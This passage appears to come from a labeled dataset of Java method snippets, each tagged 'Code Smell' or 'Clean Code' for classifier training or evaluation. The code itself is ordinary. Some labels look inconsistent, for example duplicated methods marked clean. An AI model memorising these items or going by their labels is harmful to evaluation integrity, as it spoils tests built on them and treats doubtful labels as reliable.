  while (lexer.PeekNextToken().Token.equals(""="") || lexer.PeekNextToken().Token.equals(""<"") || lexer.PeekNextToken().Token.equals("">"")) {
    String relationSymbol=lexer.PeekNextToken().Token;
    lexer.GetNextToken();
    ArithmeticExpression();
    if (relationSymbol.equals(""="")) {
      if (!Pattern.compile(currentReturnType).matcher(expressionReturnType).matches()) {
        error(""Error: in class: "" + className + "", two ends of relational expression not have same type, line: ""+ lexer.PeekNextToken().LineNumber);
      }
      vmCodeInput(""eq\n"");
    }
 else     if (relationSymbol.equals(""<"")) {
      if (!Pattern.compile(currentReturnType).matcher(expressionReturnType).matches()) {
        error(""Error: in class: "" + className + "", two ends of relational expression are not all int, line: ""+ lexer.PeekNextToken().LineNumber);
      }
      vmCodeInput(""lt\n"");
    }
 else {
      if (!Pattern.compile(currentReturnType).matcher(expressionReturnType).matches()) {
        error(""Error: in class: "" + className + "", two ends of relational expression are not all int, line: ""+ lexer.PeekNextToken().LineNumber);
      }
      vmCodeInput(""gt\n"");
    }
    expressionReturnType=""boolean"";
  }
}
",1,Code Smell
"/** 
 * Processes based on configuration specified in constructor. 
 */
void process(){
  for (  String path : args.files) {
    ClassPathOpener opener;
    opener=new ClassPathOpener(path,true,new ClassPathOpener.Consumer(){
      @Override public boolean processFileBytes(      String name,      long lastModified,      byte[] bytes){
        if (!name.endsWith("".class"")) {
          return true;
        }
        ByteArray ba=new ByteArray(bytes);
        DirectClassFile cf=new DirectClassFile(ba,name,true);
        cf.setAttributeFactory(StdAttributeFactory.THE_ONE);
        AttributeList attributes=cf.getAttributes();
        Attribute att;
        String cfClassName=cf.getThisClass().getClassType().getClassName();
        if (cfClassName.endsWith(PACKAGE_INFO)) {
          att=attributes.findFirst(AttRuntimeInvisibleAnnotations.ATTRIBUTE_NAME);
          for (; att != null; att=attributes.findNext(att)) {
            BaseAnnotations ann=(BaseAnnotations)att;
            visitPackageAnnotation(cf,ann);
          }
          att=attributes.findFirst(AttRuntimeVisibleAnnotations.ATTRIBUTE_NAME);
          for (; att != null; att=attributes.findNext(att)) {
            BaseAnnotations ann=(BaseAnnotations)att;
            visitPackageAnnotation(cf,ann);
          }
        }
 else         if (isMatchingInnerClass(cfClassName) || isMatchingPackage(cfClassName)) {
          printMatch(cf);
        }
 else {
          att=attributes.findFirst(AttRuntimeInvisibleAnnotations.ATTRIBUTE_NAME);
          for (; att != null; att=attributes.findNext(att)) {
            BaseAnnotations ann=(BaseAnnotations)att;
            visitClassAnnotation(cf,ann);
          }
          att=attributes.findFirst(AttRuntimeVisibleAnnotations.ATTRIBUTE_NAME);
          for (; att != null; att=attributes.findNext(att)) {
            BaseAnnotations ann=(BaseAnnotations)att;
            visitClassAnnotation(cf,ann);
          }
        }
        return true;
      }
      @Override public void onException(      Exception ex){
        throw new RuntimeException(ex);
      }
      @Override public void onProcessArchiveStart(      File file){
      }
    }
);
    opener.process();
  }
}
",1,Code Smell
"public void processEvent(Event event){
  event=interceptorChain.intercept(event);
  if (event == null) {
    return;
  }
  boolean success=true;
  List<Channel> requiredChannels=selector.getRequiredChannels(event);
  for (  Channel reqChannel : requiredChannels) {
    Transaction tx=reqChannel.getTransaction();
    Preconditions.checkNotNull(tx,""Transaction object must not be null"");
    try {
      tx.begin();
      reqChannel.put(event);
      tx.commit();
    }
 catch (    Throwable t) {
      if (logPrinter.shouldPrint()) {
        LOG.error(""FailoverChannelProcessor Unable to put event on required channel: {}"" + "",exception = {}"",reqChannel.getName(),t);
      }
      success=false;
      try {
        tx.rollback();
      }
 catch (      Throwable e) {
        if (logPrinter.shouldPrint()) {
          LOG.error(""FailoverChannelProcessor Transaction rollback exception"",e);
        }
      }
      break;
    }
 finally {
      tx.close();
    }
  }
  if (!success) {
    List<Channel> optionalChannels=selector.getOptionalChannels(event);
    for (    Channel optChannel : optionalChannels) {
      Transaction tx=null;
      try {
        tx=optChannel.getTransaction();
        tx.begin();
        optChannel.put(event);
        tx.commit();
      }
 catch (      Throwable t) {
        if (logPrinter.shouldPrint()) {
          LOG.error(""FailoverChannelProcessor Unable to put event on optionalChannel:"",t);
        }
        if (tx != null) {
          try {
            tx.rollback();
          }
 catch (          Throwable e) {
            if (logPrinter.shouldPrint()) {
              LOG.error(""FailoverChannelProcessor Transaction rollback exception"",e);
            }
          }
        }
        if (t instanceof Error) {
          if (logPrinter.shouldPrint()) {
            LOG.error(""FailoverChannelProcessor Error while writing event to "" + ""optionalChannels: "" + optChannel,t);
          }
          throw (Error)t;
        }
 else {
          throw new ChannelException(""FailoverChannelProcessor Unable to put event on "" + ""optionalChannels: "" + optChannel,t);
        }
      }
 finally {
        if (tx != null) {
          tx.close();
        }
      }
    }
  }
}
",1,Code Smell
"@Override public void showTitleView(boolean show){
  mShowTitleView=show;
  if (mMainFragmentAdapter == null || mMainFragmentAdapter.getFragmentHost() != this) {
    return;
  }
  if (!mIsPageRow) {
    return;
  }
  updateTitleViewVisibility();
}
@Override public void showTitleView(boolean show){
  mShowTitleView=show;
  if (mMainFragmentAdapter == null || mMainFragmentAdapter.getFragmentHost() != this) {
    return;
  }
  if (!mIsPageRow) {
    return;
  }
  updateTitleViewVisibility();
}
",0,Clean Code
"@Override public Socket createSocket() throws IOException {
  return enableTLSOnSocket(internalSSLSocketFactory.createSocket());
}
@Override public Socket createSocket(Socket s,String host,int port,boolean autoClose) throws IOException {
  return enableTLSOnSocket(internalSSLSocketFactory.createSocket(s,host,port,autoClose));
}
@Override public Socket createSocket(String host,int port) throws IOException, UnknownHostException {
  return enableTLSOnSocket(internalSSLSocketFactory.createSocket(host,port));
}
@Override public Socket createSocket(String host,int port,InetAddress localHost,int localPort) throws IOException, UnknownHostException {
  return enableTLSOnSocket(internalSSLSocketFactory.createSocket(host,port,localHost,localPort));
}
@Override public Socket createSocket(InetAddress host,int port) throws IOException {
  return enableTLSOnSocket(internalSSLSocketFactory.createSocket(host,port));
}
@Override public Socket createSocket(InetAddress address,int port,InetAddress localAddress,int localPort) throws IOException {
  return enableTLSOnSocket(internalSSLSocketFactory.createSocket(address,port,localAddress,localPort));
}
",0,Clean Code
"private static int cloneBlocks(BoundingBox sourceArea,ServerLevel world,BlockPos diffToTarget){
  int blockPastes=0;
  List<StructureTemplate.StructureBlockInfo> blocks=Lists.newArrayList();
  List<StructureTemplate.StructureBlockInfo> beBlocks=Lists.newArrayList();
  for (int z=sourceArea.minZ(); z <= sourceArea.maxZ(); ++z) {
    for (int y=sourceArea.minY(); y <= sourceArea.maxY(); ++y) {
      for (int x=sourceArea.minX(); x <= sourceArea.maxX(); ++x) {
        BlockPos currentPos=new BlockPos(x,y,z);
        BlockPos newPos=currentPos.offset(diffToTarget);
        BlockInWorld cached=new BlockInWorld(world,currentPos,false);
        BlockState state=cached.getState();
        BlockEntity be=world.getBlockEntity(currentPos);
        if (be != null) {
          CompoundTag nbt=be.saveWithFullMetadata();
          beBlocks.add(new StructureTemplate.StructureBlockInfo(newPos,state,nbt));
        }
 else {
          blocks.add(new StructureTemplate.StructureBlockInfo(newPos,state,null));
        }
      }
    }
  }
  List<StructureTemplate.StructureBlockInfo> allBlocks=Lists.newArrayList();
  allBlocks.addAll(blocks);
  allBlocks.addAll(beBlocks);
  List<StructureTemplate.StructureBlockInfo> reverse=Lists.reverse(allBlocks);
  for (  StructureTemplate.StructureBlockInfo info : reverse) {
    BlockEntity be=world.getBlockEntity(info.pos());
    Clearable.tryClear(be);
    world.setBlock(info.pos(),Blocks.BARRIER.defaultBlockState(),2);
  }
  for (  StructureTemplate.StructureBlockInfo info : allBlocks) {
    if (world.setBlock(info.pos(),info.state(),2))     blockPastes++;
  }
  for (  StructureTemplate.StructureBlockInfo info : beBlocks) {
    BlockEntity be=world.getBlockEntity(info.pos());
    if (be != null && info.nbt() != null) {
      info.nbt().putInt(""x"",info.pos().getX());
      info.nbt().putInt(""y"",info.pos().getY());
      info.nbt().putInt(""z"",info.pos().getZ());
      be.load(info.nbt());
      be.setChanged();
    }
    world.setBlock(info.pos(),info.state(),2);
  }
  for (  StructureTemplate.StructureBlockInfo info : reverse) {
    world.blockUpdated(info.pos(),info.state().getBlock());
  }
  world.getBlockTicks().copyArea(sourceArea,diffToTarget);
  return blockPastes;
}",1,Code Smell
"private static Class<?> hasType(Class<?> clz){
  try {
    if (clz.equals(Boolean.class)) {
      return boolean.class;
    }
    if (clz.equals(Integer.class)) {
      return int.class;
    }
    if (clz.equals(Long.class)) {
      return long.class;
    }
    if (clz.equals(Byte.class)) {
      return byte.class;
    }
    if (clz.equals(Short.class)) {
      return short.class;
    }
    if (clz.equals(Float.class)) {
      return float.class;
    }
    if (clz.equals(Double.class)) {
      return double.class;
    }
    if (clz.equals(Character.class)) {
      return char.class;
    }
    return null;
  }
 catch (  Exception e) {
    return null;
  }
}
",0,Clean Code
"private static void startAppShortcutOrInfoActivity(View v,ItemInfo item,Launcher launcher){
  TestLogging.recordEvent(TestProtocol.SEQUENCE_MAIN,""start: startAppShortcutOrInfoActivity"");
  Intent intent;
  if (item instanceof ItemInfoWithIcon && (((ItemInfoWithIcon)item).runtimeStatusFlags & ItemInfoWithIcon.FLAG_INSTALL_SESSION_ACTIVE) != 0) {
    ItemInfoWithIcon appInfo=(ItemInfoWithIcon)item;
    intent=new PackageManagerHelper(launcher).getMarketIntent(appInfo.getTargetComponent().getPackageName());
  }
 else {
    intent=item.getIntent();
  }
  if (intent == null) {
    throw new IllegalArgumentException(""Input must have a valid intent"");
  }
  boolean isProtected=false;
  if (item instanceof WorkspaceItemInfo) {
    WorkspaceItemInfo si=(WorkspaceItemInfo)item;
    if (si.hasStatusFlag(WorkspaceItemInfo.FLAG_SUPPORTS_WEB_UI) && Intent.ACTION_VIEW.equals(intent.getAction())) {
      intent=new Intent(intent);
      intent.setPackage(null);
    }
    isProtected=Config.Companion.isAppProtected(launcher.getApplicationContext(),new ComponentKey(si.getTargetComponent(),si.user)) && Utilities.getNeoPrefs(launcher.getApplicationContext()).getDrawerEnableProtectedApps().getValue();
    if ((si.options & WorkspaceItemInfo.FLAG_START_FOR_RESULT) != 0) {
      launcher.startActivityForResult(item.getIntent(),0);
      InstanceId instanceId=new InstanceIdSequence().newInstanceId();
      launcher.logAppLaunch(launcher.getStatsLogManager(),item,instanceId);
      return;
    }
  }
  if (v != null && launcher.supportsAdaptiveIconAnimation(v) && !item.shouldUseBackgroundAnimation()) {
    FloatingIconView.fetchIcon(launcher,v,item,true);
  }
  if (item instanceof AppInfo) {
    AppTrackerRepository repository=AppTrackerRepository.Companion.getINSTANCE().get(launcher.getApplicationContext());
    repository.updateAppCount(((AppInfo)item).componentName.getPackageName());
    isProtected=Config.Companion.isAppProtected(launcher.getApplicationContext(),((AppInfo)item).toComponentKey()) && Utilities.getNeoPrefs(launcher.getApplicationContext()).getDrawerEnableProtectedApps().getValue();
  }
  if (isProtected && Utilities.ATLEAST_R) {
    launcher.startActivitySafelyAuth(v,intent,item);
  }
 else {
    launcher.startActivitySafely(v,intent,item);
  }
}",1,Code Smell
"private MainPlayerController(Context context){
  if (context instanceof Activity) {
    mActivity=new WeakReference<>((Activity)context);
  }
  mEventListeners.add(new AutoFrameRateController());
  mEventListeners.add(new PlayerUIController());
  mEventListeners.add(new HQDialogController());
  mEventListeners.add(new VideoStateController());
  mEventListeners.add(new SuggestionsController());
  mEventListeners.add(new VideoLoaderController());
  mEventListeners.add(new RemoteController(context));
  mEventListeners.add(new ContentBlockController());
  mEventListeners.add(new ChatController());
  mEventListeners.add(new CommentsController());
}
",0,Clean Code
"private void reduceCraftingGrid(boolean makeAll){
  if (gridSize == -1)   return;
  int crafted;
  if (!makeAll) {
    crafted=1;
  }
 else {
    crafted=0;
    for (int i=0; i < gridSize; i++) {
      GeyserItemStack item=getItem(i + 1);
      if (!item.isEmpty()) {
        if (crafted == 0) {
          crafted=item.getAmount();
        }
        crafted=Math.min(crafted,item.getAmount());
      }
    }
  }
  for (int i=0; i < gridSize; i++) {
    final int slot=i + 1;
    GeyserItemStack item=getItem(slot);
    if (!item.isEmpty()) {
      sub(slot,item,crafted);
    }
  }
}",1,Code Smell
"@Override Duration increment(Duration time,int steps){
  return checkBounds(time,time.plusDays(steps));
}
@Override Duration increment(Duration time,int steps){
  return checkBounds(time,time.plusHours(steps));
}
@Override Duration increment(Duration time,int steps){
  return checkBounds(time,time.plusMinutes(steps * TransactionInput.RELATIVE_TIMELOCK_SECONDS_INCREMENT / 60));
}
@Override Duration increment(Duration time,int steps){
  return time.plusSeconds(steps * TransactionInput.RELATIVE_TIMELOCK_SECONDS_INCREMENT);
}
abstract Duration increment(Duration time,int steps);
@Override public void increment(int steps){
  checkMode();
  setValue(mode.get().increment(getValue(),steps));
  mode.get().select(RelativeTimelockSpinner.this);
}",0,Clean Code
"/** 
 * Searches the query string for the first value with the given key. <p><strong>Warning:</strong> Prior to Jelly Bean, this decoded the '+' character as '+' rather than ' '.
 * @param key which will be encoded
 * @throws UnsupportedOperationException if this isn't a hierarchical URI
 * @throws NullPointerException if key is null
 * @return the decoded value or null if no parameter is found
 */
public String getQueryParameter(String key){
  if (isOpaque()) {
    throw new UnsupportedOperationException(NOT_HIERARCHICAL);
  }
  if (key == null) {
    throw new NullPointerException(""key"");
  }
  final String query=getEncodedQuery();
  if (query == null) {
    return null;
  }
  final String encodedKey=encode(key,null);
  final int length=query.length();
  int start=0;
  do {
    int nextAmpersand=query.indexOf('&',start);
    int end=nextAmpersand != -1 ? nextAmpersand : length;
    int separator=query.indexOf('=',start);
    if (separator > end || separator == -1) {
      separator=end;
    }
    if (separator - start == encodedKey.length() && query.regionMatches(start,encodedKey,0,encodedKey.length())) {
      if (separator == end) {
        return """";
      }
 else {
        String encodedValue=query.substring(separator + 1,end);
        return UriCodec.decode(encodedValue,true,StandardCharsets.UTF_8,false);
      }
    }
    if (nextAmpersand != -1) {
      start=nextAmpersand + 1;
    }
 else {
      break;
    }
  }
 while (true);
  return null;
}",0,Clean Code
"protected InputStream openExternalUri(URI uri) throws SecurityManagerException {
  if (!HttpUtils.isHttpUrl(uri)) {
    throw new IllegalArgumentException(""Expected HTTP(S) URL, but got: "" + uri);
  }
  securityManager.checkReadResource(uri);
  var request=HttpRequest.newBuilder(uri).build();
  HttpResponse<InputStream> response;
  try {
    response=httpClient.send(request,BodyHandlers.ofInputStream());
  }
 catch (  IOException e) {
    throw new PackageLoadError(e,""ioErrorMakingHttpGet"",uri,e.getMessage());
  }
  try {
    HttpUtils.checkHasStatusCode200(response);
  }
 catch (  IOException e) {
    throw new PackageLoadError(""badHttpStatusCode"",response.statusCode(),response.uri());
  }
  return response.body();
}",0,Clean Code
"/** 
 * Removes all instructions from every unreachable block. 
 */
private void pruneDeadInstructions(){
  HashSet<SsaInsn> deletedInsns=new HashSet<SsaInsn>();
  BitSet reachable=ssaMeth.computeReachability();
  ArrayList<SsaBasicBlock> blocks=ssaMeth.getBlocks();
  int blockIndex=0;
  while ((blockIndex=reachable.nextClearBit(blockIndex)) < blocks.size()) {
    SsaBasicBlock block=blocks.get(blockIndex);
    blockIndex++;
    for (int i=0; i < block.getInsns().size(); i++) {
      SsaInsn insn=block.getInsns().get(i);
      RegisterSpecList sources=insn.getSources();
      int sourcesSize=sources.size();
      if (sourcesSize != 0) {
        deletedInsns.add(insn);
      }
      for (int j=0; j < sourcesSize; j++) {
        RegisterSpec source=sources.get(j);
        useList[source.getReg()].remove(insn);
      }
      RegisterSpec result=insn.getResult();
      if (result == null)       continue;
      for (      SsaInsn use : useList[result.getReg()]) {
        if (use instanceof PhiInsn) {
          PhiInsn phiUse=(PhiInsn)use;
          phiUse.removePhiRegister(result);
        }
      }
    }
  }
  ssaMeth.deleteInsns(deletedInsns);
}",1,Code Smell
"public void drawDividers(Canvas canvas,int w,int h){
  if (mDividerPaint == null && (mTopDividerHeight > 0 || mBottomDividerHeight > 0 || mLeftDividerWidth > 0 || mRightDividerWidth > 0)) {
    mDividerPaint=new Paint();
  }
  if (mTopDividerHeight > 0) {
    mDividerPaint.setStrokeWidth(mTopDividerHeight);
    mDividerPaint.setColor(mTopDividerColor);
    if (mTopDividerAlpha < 255) {
      mDividerPaint.setAlpha(mTopDividerAlpha);
    }
    float y=mTopDividerHeight * 1f / 2;
    canvas.drawLine(mTopDividerInsetLeft,y,w - mTopDividerInsetRight,y,mDividerPaint);
  }
  if (mBottomDividerHeight > 0) {
    mDividerPaint.setStrokeWidth(mBottomDividerHeight);
    mDividerPaint.setColor(mBottomDividerColor);
    if (mBottomDividerAlpha < 255) {
      mDividerPaint.setAlpha(mBottomDividerAlpha);
    }
    float y=(float)Math.floor(h - mBottomDividerHeight * 1f / 2);
    canvas.drawLine(mBottomDividerInsetLeft,y,w - mBottomDividerInsetRight,y,mDividerPaint);
  }
  if (mLeftDividerWidth > 0) {
    mDividerPaint.setStrokeWidth(mLeftDividerWidth);
    mDividerPaint.setColor(mLeftDividerColor);
    if (mLeftDividerAlpha < 255) {
      mDividerPaint.setAlpha(mLeftDividerAlpha);
    }
    canvas.drawLine(0,mLeftDividerInsetTop,0,h - mLeftDividerInsetBottom,mDividerPaint);
  }
  if (mRightDividerWidth > 0) {
    mDividerPaint.setStrokeWidth(mRightDividerWidth);
    mDividerPaint.setColor(mRightDividerColor);
    if (mRightDividerAlpha < 255) {
      mDividerPaint.setAlpha(mRightDividerAlpha);
    }
    canvas.drawLine(w,mRightDividerInsetTop,w,h - mRightDividerInsetBottom,mDividerPaint);
  }
}",0,Clean Code
"@Override public void onReceive(Context context,Intent intent){
switch (getResultCode()) {
case Activity.RESULT_OK:
    break;
case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
  Toast.makeText(context,""SMS generic failure, close app & upload logs."",Toast.LENGTH_SHORT).show();
if (BuildConfig.DEBUG) {
  int errorCode=intent.getIntExtra(""errorCode"",-1);
  if (errorCode != -1) {
    MainBrowserScreen.rootLogger.log(Level.INFO,""Error code: "" + String.valueOf(errorCode));
  }
 else {
    MainBrowserScreen.rootLogger.log(Level.INFO,""Unknown Error code: -1. This should never happen!"");
  }
}
break;
case SmsManager.RESULT_ERROR_NO_SERVICE:
Toast.makeText(context,""SMS no service"",Toast.LENGTH_SHORT).show();
break;
case SmsManager.RESULT_ERROR_NULL_PDU:
Toast.makeText(context,""SMS null PDU"",Toast.LENGTH_SHORT).show();
break;
case SmsManager.RESULT_ERROR_RADIO_OFF:
Toast.makeText(context,""SMS radio off - turn off airplane mode!"",Toast.LENGTH_SHORT).show();
break;
}
}",1,Code Smell
"private void logMQTTMessage(ChannelHandlerContext ctx,Object message,String direction){
  if (!(message instanceof MqttMessage)) {
    return;
  }
  MqttMessage msg=(MqttMessage)message;
  String clientID=NettyUtils.clientID(ctx.channel());
  MqttMessageType messageType=msg.fixedHeader().messageType();
switch (messageType) {
case CONNECT:
case CONNACK:
case PINGREQ:
case PINGRESP:
case DISCONNECT:
    LOG.info(""{} {} <{}>"",direction,messageType,clientID);
  break;
case SUBSCRIBE:
MqttSubscribeMessage subscribe=(MqttSubscribeMessage)msg;
LOG.info(""{} SUBSCRIBE <{}> to topics {}"",direction,clientID,subscribe.payload().topicSubscriptions());
break;
case UNSUBSCRIBE:
MqttUnsubscribeMessage unsubscribe=(MqttUnsubscribeMessage)msg;
LOG.info(""{} UNSUBSCRIBE <{}> to topics <{}>"",direction,clientID,unsubscribe.payload().topics());
break;
case PUBLISH:
MqttPublishMessage publish=(MqttPublishMessage)msg;
LOG.info(""{} PUBLISH <{}> to topics <{}>"",direction,clientID,publish.variableHeader().topicName());
break;
case PUBREC:
case PUBCOMP:
case PUBREL:
case PUBACK:
case UNSUBACK:
LOG.info(""{} {} <{}> packetID <{}>"",direction,messageType,clientID,messageId(msg));
break;
case SUBACK:
MqttSubAckMessage suback=(MqttSubAckMessage)msg;
final List<Integer> grantedQoSLevels=suback.payload().grantedQoSLevels();
LOG.info(""{} SUBACK <{}> packetID <{}>, grantedQoses {}"",direction,clientID,messageId(msg),grantedQoSLevels);
break;
}
}
",0,Clean Code
"public static List<Condition> geneEruptSearchCondition(EruptModel eruptModel,List<Condition> searchCondition){
  checkEruptSearchNotnull(eruptModel,searchCondition);
  List<Condition> legalConditions=new ArrayList<>();
  if (null != searchCondition) {
    for (    Condition condition : searchCondition) {
      EruptFieldModel eruptFieldModel=eruptModel.getEruptFieldMap().get(condition.getKey());
      if (null != eruptFieldModel) {
        Edit edit=eruptFieldModel.getEruptField().edit();
        EditTypeSearch editTypeSearch=AnnotationProcess.getEditTypeSearch(edit.type());
        if (null != editTypeSearch && editTypeSearch.value()) {
          if (edit.search().value() && null != condition.getValue()) {
            if (condition.getValue() instanceof Collection) {
              Collection<?> collection=(Collection<?>)condition.getValue();
              if (collection.size() == 0) {
                continue;
              }
            }
            if (edit.search().vague()) {
              condition.setExpression(editTypeSearch.vagueMethod());
            }
 else {
              condition.setExpression(QueryExpression.EQ);
            }
            legalConditions.add(condition);
          }
        }
      }
    }
  }
  return legalConditions;
}",0,Clean Code
"private void createPanel(final boolean indeterminate,final boolean showSeconds,final boolean showCancelButton,final boolean addBorder){
  setLayout(new BorderLayout());
  final JPanel pPb=new JPanel(new BorderLayout());
  pPb.setBorder(new TitledBorder(""""));
  if (m_description == null) {
    m_label.setVisible(false);
  }
 else {
    m_label.setText(convertTextToHtml(m_description));
  }
  pPb.add(m_label,BorderLayout.NORTH);
  m_progressBar.setIndeterminate(indeterminate);
  m_progressBar.setStringPainted(true);
  final JPanel borderPanel=new JPanel(new BorderLayout());
  if (addBorder) {
    borderPanel.setBorder(BorderFactory.createCompoundBorder(new LineBorder(Color.GRAY),new EmptyBorder(1,1,1,1)));
  }
  if (showCancelButton) {
    final JPanel buttonPanel=new JPanel(new BorderLayout());
    final JButton cancelButton=new JButton(new CancelAction());
    cancelButton.setFocusable(false);
    final JPanel paddingPanel=new JPanel(new BorderLayout());
    paddingPanel.setBorder(new EmptyBorder(0,1,0,0));
    paddingPanel.setMinimumSize(new Dimension(1,0));
    buttonPanel.add(paddingPanel,BorderLayout.WEST);
    buttonPanel.add(cancelButton,BorderLayout.EAST);
    borderPanel.add(buttonPanel,BorderLayout.EAST);
  }
  borderPanel.add(m_progressBar,BorderLayout.CENTER);
  pPb.add(borderPanel,BorderLayout.CENTER);
  if (indeterminate && showSeconds) {
    updateSecondsText();
    m_timer.setRepeats(true);
  }
  add(pPb,BorderLayout.NORTH);
}",0,Clean Code
"@NonNull public static RuleEntry unflattenFromString(@Nullable String packageName,@NonNull String ruleLine,boolean isExternal) throws IllegalArgumentException {
  StringTokenizer tokenizer=new StringTokenizer(ruleLine,""\t"");
  if (isExternal) {
    if (tokenizer.hasMoreElements()) {
      String newPackageName=tokenizer.nextElement().toString();
      if (packageName == null)       packageName=newPackageName;
      if (!packageName.equals(newPackageName)) {
        throw new IllegalArgumentException(""Invalid format: package names do not match."");
      }
    }
 else     throw new IllegalArgumentException(""Invalid format: packageName not found for external rule."");
  }
  if (packageName == null) {
    throw new IllegalArgumentException(""Package name cannot be empty."");
  }
  String name;
  RuleType type;
  if (tokenizer.hasMoreElements()) {
    name=tokenizer.nextElement().toString();
  }
 else   throw new IllegalArgumentException(""Invalid format: name not found"");
  if (tokenizer.hasMoreElements()) {
    try {
      type=RuleType.valueOf(tokenizer.nextElement().toString());
    }
 catch (    Exception e) {
      throw new IllegalArgumentException(""Invalid format: Invalid type"");
    }
  }
 else   throw new IllegalArgumentException(""Invalid format: entryType not found"");
  return getRuleEntry(packageName,name,type,tokenizer);
}
",0,Clean Code
"/** 
 * Returns default estimates for selectivities, in the absence of stats.
 * @param predicate predicate for which selectivity will be computed; nullmeans true, so gives selectity of 1.0
 * @return estimated selectivity
 */
public static double guessSelectivity(RexNode predicate){
  return guessSelectivity(predicate,false);
}
/** 
 * Returns default estimates for selectivities, in the absence of stats.
 * @param predicate      predicate for which selectivity will be computed;null means true, so gives selectity of 1.0
 * @param artificialOnly return only the selectivity contribution fromartificial nodes
 * @return estimated selectivity
 */
public static double guessSelectivity(RexNode predicate,boolean artificialOnly){
  double sel=1.0;
  if ((predicate == null) || predicate.isAlwaysTrue()) {
    return sel;
  }
  double artificialSel=1.0;
  for (  RexNode pred : RelOptUtil.conjunctions(predicate)) {
    if (pred.getKind() == SqlKind.IS_NOT_NULL) {
      sel*=.9;
    }
 else     if ((pred instanceof RexCall) && (((RexCall)pred).getOperator() == RelMdUtil.ARTIFICIAL_SELECTIVITY_FUNC)) {
      artificialSel*=RelMdUtil.getSelectivityValue(pred);
    }
 else     if (pred.isA(SqlKind.EQUALS)) {
      sel*=.15;
    }
 else     if (pred.isA(SqlKind.COMPARISON)) {
      sel*=.5;
    }
 else {
      sel*=.25;
    }
  }
  if (artificialOnly) {
    return artificialSel;
  }
 else {
    return sel * artificialSel;
  }
}",0,Clean Code
"@Override public boolean onOptionsItemSelected(@NonNull MenuItem item){
  int id=item.getItemId();
  if (id == R.id.action_refresh) {
    mModel.reload();
    return true;
  }
 else   if (id == R.id.action_shortcut) {
    Uri uri=mPathListAdapter.getCurrentUri();
    if (uri != null) {
      mModel.createShortcut(uri);
    }
    return true;
  }
 else   if (id == R.id.action_storage) {
    ThreadUtils.postOnBackgroundThread(() -> {
      ArrayMap<String,Uri> storageLocations=StorageUtils.getAllStorageLocations(mActivity);
      if (storageLocations.size() == 0) {
        mActivity.runOnUiThread(() -> {
          if (isDetached())           return;
          new MaterialAlertDialogBuilder(mActivity).setTitle(R.string.storage).setMessage(R.string.no_volumes_found).setNegativeButton(R.string.ok,null).show();
        }
);
        return;
      }
      Uri[] backupVolumes=new Uri[storageLocations.size()];
      CharSequence[] backupVolumesStr=new CharSequence[storageLocations.size()];
      for (int i=0; i < storageLocations.size(); ++i) {
        backupVolumes[i]=storageLocations.valueAt(i);
        backupVolumesStr[i]=new SpannableStringBuilder(storageLocations.keyAt(i)).append(""\n"").append(getSecondaryText(mActivity,getSmallerText(backupVolumes[i].getPath())));
      }
      mActivity.runOnUiThread(() -> {
        if (isDetached())         return;
        new SearchableItemsDialogBuilder<>(mActivity,backupVolumesStr).setTitle(R.string.storage).setOnItemClickListener((dialog,which,item1) -> {
          mModel.loadFiles(backupVolumes[which]);
          dialog.dismiss();
        }
).setNegativeButton(R.string.cancel,null).show();
      }
);
    }
);
    return true;
  }
 else   if (id == R.id.action_list_options) {
    FmListOptions listOptions=new FmListOptions();
    listOptions.setListOptionActions(mModel);
    listOptions.show(getChildFragmentManager(),FmListOptions.TAG);
    return true;
  }
 else   if (id == R.id.action_paste) {
    FmTasks.FmTask task=FmTasks.getInstance().dequeue();
    if (task != null) {
      startBatchPaste(task);
    }
    return true;
  }
 else   if (id == R.id.action_new_window) {
    Intent intent=new Intent(mActivity,FmActivity.class);
    if (!mModel.getOptions().isVfs) {
      intent.setDataAndType(mModel.getCurrentUri(),DocumentsContract.Document.MIME_TYPE_DIR);
    }
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
    startActivity(intent);
    return true;
  }
 else   if (id == R.id.action_settings) {
    Intent intent=SettingsActivity.getIntent(requireContext(),""files_prefs"");
    startActivity(intent);
    return true;
  }
  return super.onOptionsItemSelected(item);
}",0,Clean Code
"public static <T>T newInstance(Class<T> clazz){
  try {
    Constructor<?> defaultConstructor=null;
    Constructor<?> otherConstructor=null;
    Constructor<?>[] declaredConstructors=clazz.getDeclaredConstructors();
    for (    Constructor<?> constructor : declaredConstructors) {
      if (constructor.getParameterCount() == 0 && Modifier.isPublic(constructor.getModifiers())) {
        defaultConstructor=constructor;
      }
 else       if (Modifier.isPublic(constructor.getModifiers())) {
        otherConstructor=constructor;
      }
    }
    if (defaultConstructor != null) {
      return (T)defaultConstructor.newInstance();
    }
 else     if (otherConstructor != null) {
      Class<?>[] parameterTypes=otherConstructor.getParameterTypes();
      Object[] parameters=new Object[parameterTypes.length];
      for (int i=0; i < parameterTypes.length; i++) {
        if (parameterTypes[i].isPrimitive()) {
          parameters[i]=ConvertUtil.getPrimitiveDefaultValue(parameterTypes[i]);
        }
 else {
          parameters[i]=null;
        }
      }
      return (T)otherConstructor.newInstance(parameters);
    }
 else {
      Method factoryMethod=ClassUtil.getFirstMethod(clazz,m -> m.getParameterCount() == 0 && m.getReturnType().isAssignableFrom(clazz) && Modifier.isPublic(m.getModifiers()) && Modifier.isStatic(m.getModifiers()));
      if (factoryMethod != null) {
        return (T)factoryMethod.invoke(null);
      }
    }
    throw new IllegalArgumentException(""the class \"""" + clazz.getName() + ""\"" has no constructor."");
  }
 catch (  Exception e) {
    throw new RuntimeException(""Can not newInstance class: "" + clazz.getName(),e);
  }
}
public static <T>T newInstance(Class<T> clazz,Object... paras){
  try {
    Constructor<?>[] constructors=clazz.getDeclaredConstructors();
    for (    Constructor<?> constructor : constructors) {
      if (isMatchedParas(constructor,paras)) {
        Object ret=constructor.newInstance(paras);
        return (T)ret;
      }
    }
    throw new IllegalArgumentException(""Can not find constructor by paras: \"""" + Arrays.toString(paras) + ""\"" in class[""+ clazz.getName()+ ""]"");
  }
 catch (  Exception e) {
    throw new RuntimeException(e.toString(),e);
  }
}",1,Code Smell
"@Override public Version deserialize(JsonElement json,Type typeOfT,JsonDeserializationContext context) throws JsonParseException {
  JsonObject versionJson=json.getAsJsonObject();
  Version version=new Version();
  version.setAssetIndexInfo(context.deserialize(versionJson.get(""assetIndex""),Version.AssetIndexInfo.class));
  version.setAssets(versionJson.get(""assets"").getAsString());
  version.setDownloads(context.deserialize(versionJson.get(""downloads""),new TypeToken<Map<DownloadType,DownloadInfo>>(){
  }
.getType()));
  version.setId(versionJson.get(""id"").getAsString());
  version.setLibraries(context.deserialize(versionJson.get(""libraries""),Library[].class));
